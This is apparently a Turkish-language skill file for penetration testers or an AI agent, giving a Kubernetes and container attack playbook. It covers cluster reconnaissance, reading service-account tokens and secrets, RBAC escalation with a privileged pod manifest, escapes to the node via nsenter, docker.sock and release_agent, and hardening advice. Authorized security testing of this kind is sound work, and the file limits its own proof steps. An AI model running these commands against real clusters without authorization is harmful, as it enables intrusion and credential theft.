---
name: k8s-container-security
description: Kubernetes ve konteyner güvenliği: dışarıdan/aşağıdan küme keşfi, RBAC ve service account istismarı, pod'dan node/cloud'a kaçış, impact kanıtı ve sertleştirme.
---
# Kubernetes & Container Security

## Amaç
Küme dışından (internet) veya bir pod içinden (compromised workload) node/cloud kontrolüne giden yolu kurmak ve kanıtlamak. Bulut metadata tarafı için `cloud-attack-path` ile birleştir.

## 1) Dışarıdan keşif
```bash
kube-hunter --remote <ip>                 # açık API/kubelet/etcd
nmap -p 6443,10250,10255,2379,8080,30000-32767 <cidr>
# anonim API
curl -k https://<api>:6443/api/v1/namespaces
```
Kontrol: anonim auth (`system:anonymous`), kubelet 10250/10255 read-only, etcd 2379 açık, dashboard/ingress, exposed service'ler.

## 2) Pod/container içinden
```bash
kubectl auth can-i --list                 # mevcut SA yetkileri
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cdk evaluate ; ./cdk run <module>         # container escape araç seti
deepce.sh ; peirates                        # alternatif keşif/exploit
```
Topla: SA token, namespace, RBAC izinleri, mounted secret/configmap, env, network policy, node bilgisi, `hostPath`/`hostPID`/`hostNetwork`/`privileged`, capabilities.

## 3) Yükselme yolları
- **RBAC**: `create pods`, `create deployment/daemonset`, `get secrets`, `pods/exec`, `impersonate`, `bind` (ClusterRoleBinding), `escalate`. Yeni pod ile cluster-admin SA'yı mount et.
```yaml
apiVersion: v1
kind: Pod
spec:
  serviceAccountName: <priv-sa>
  containers: [{name: p, image: alpine, command: ["sleep","infinity"]}]
```
- **Secret/ConfigMap** okuma → cloud kimlik bilgisi, registry, DB.
- **Node'a kaçış**:
  - `privileged: true` + `CAP_SYS_ADMIN` → cgroup `release_agent`, `/proc/1/root` ile host fs mount.
  - `hostPath: /` veya `/var/run/docker.sock` → host kontrolü.
  - `hostPID` + `nsenter -t 1 -m -u -i -n -p sh`.
  - `hostNetwork` → node'un metadata/IMDS erişimi (169.254.169.254).
- **Kubelet API** (10250) → `/run/<ns>/<pod>` exec; token varsa.
- **Etcd** açık → tüm secret'lar.
- **Image**: latest/unsigned, private registry auth, `imagePullSecrets`.
- **Kernel escape**: bilinen CVE'ler (runc, overlayfs) — yalnız sürüm eşleşmesi doğrulanınca, lab'da.

## 4) Impact kanıtı (L3/L4)
```bash
kubectl get secret <one> -o jsonpath='{.data.password}' | base64 -d | cut -c1-4   # maskeli
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
# node kanıtı: yalnız okuma
nsenter -t 1 -m cat /etc/hostname
```
Tek secret/tek dosya; değer maskeli. Cluster-admin kanıtı: `kubectl auth can-i '*' '*' --all-namespaces` = yes ise L4. **Toplu secret dump / node imajı indirme yok.**

## 5) Temizlik
Oluşturulan pod/deployment/SA/ClusterRoleBinding → sil, `kubectl delete -f`. Secret okunduysa rotation öner. Node'a yazdıysan dosyayı kaldır ve doğrula.

## 6) Sertleştirme
PSA/restricted, RBAC least privilege, automountServiceAccountToken=false, readOnlyRootFilesystem, drop ALL caps, seccomp/AppArmor, NetworkPolicy default-deny, audit log, kubelet authn/authz, etcd TLS+auth, image signing (cosign) + admission (Kyverno/OPA), node isolation.
